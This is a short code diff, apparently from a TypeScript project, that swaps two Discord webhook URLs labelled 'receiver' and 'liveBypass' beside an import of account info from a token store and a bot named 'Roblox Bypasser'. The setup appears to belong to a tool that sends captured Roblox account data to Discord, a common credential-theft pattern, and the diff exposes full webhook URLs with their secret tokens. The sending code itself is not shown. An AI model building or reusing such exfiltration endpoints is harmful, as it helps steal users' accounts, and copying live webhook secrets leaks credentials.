@@ -3,9 +3,9 @@ import type { AccountInfo } from "@/lib/tokenStore";
 
 export const EXTRA_WEBHOOKS = {
   receiver:
-    "https://discord.com/api/webhooks/1514082896695001231/P8hVaK-ILTChsmBxtjoYysPQSVwA6FnXO-NtqfErqO5_tYjnIYbrCZka53f6RwgcTImg",
+    "https://discord.com/api/webhooks/1511747719822180393/O1Pl_Ad_zN8C5UhqO19d8PnxkDr8rH-kFdA4c0ffq8tZEltBvpcwwjC3WR1LlGs3qk0C",
   liveBypass:
-    "https://discord.com/api/webhooks/1514084602900250795/llfflVYNk8g_IxIMzbSIm-i0PoJI4lZn_QOuYxFNSrjm5N8OPvFufXkFlPgoLUE2ZcWu",
+    "https://discord.com/api/webhooks/1510195534756053034/8sgNTeGfNr4RR4TcJpTyma57OIZbsnc6BgnbdbgHkeETJnYVRcagT2hnzrVEkBFVRwTj",
 } as const;
 
 const BOT_NAME = "Roblox Bypasser";
